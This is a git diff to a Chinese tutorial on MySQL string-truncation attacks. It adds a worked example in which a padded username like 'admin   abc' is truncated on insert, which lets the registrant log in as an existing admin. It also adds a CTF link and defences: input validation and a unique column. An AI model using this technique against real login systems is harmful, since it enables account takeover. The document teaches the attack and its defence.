@@ -52,7 +52,67 @@ mysql>
 ```
 user表在创建时指定了username字段最大长度为10，而在insert插入数据时，'112233445566'长度为12，此时就会发生字符串截断，通过查询可以看到，最后的'66'没有在username中。
 
+#### 利用示例
+```
+<?php
+$username = mysql_real_escape_string($_GET['username']);
+$password = mysql_real_escape_string($_GET['password']);
+$query = "SELECT username FROM user
+          WHERE username='$username'
+          AND password='$password' ";
+$res = mysql_query($query, $database);
+if($res) {
+  if(mysql_num_rows($res) > 0){
+      return $username;
+  }
+}
+return Null;
+?>
+```
+对于上面的验证代码，不存在SQL注入漏洞，假设存在一个admin用户，但不知道密码。
+```
+mysql> select * from user;
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | not know |
++----------+----------+
+```
+此时就可以先注册一个用户"admin                  abc"，利用超长空格使insert时发生阶段。
+```
+mysql> insert into user(username, password) values('admin         abc','1234');
+Query OK, 1 row affected, 1 warning (0.17 sec)
+
+mysql> 
+mysql> select *,length(username) from user;
++------------+----------+------------------+
+| username   | password | length(username) |
++------------+----------+------------------+
+| admin      | not know |                5 |
+| admin      | 1234     |               10 |
++------------+----------+------------------+
+2 rows in set (0.00 sec)
+
+mysql> 
+```
+可以看到username列有两个"admin"，此时利用admin/1234即可认证成功。对应的查询语句为:
+```
+mysql> select username from user where username='admin' and password='1234';
++------------+
+| username   |
++------------+
+| admin      |
++------------+
+1 row in set (0.00 sec)
+
+mysql>
+```
+一道CTF题，http://47.93.190.246:49163/
+
 #### 防范措施
+* 校验用户输入
+
+在执行insert语句之前需要先判断传人的参数是否合法，如是否长度是否过长或过短，是否包含不允许的字符类型等等。
 * 对列设置unique属性
 ```
 mysql> alter table user add unique (username);
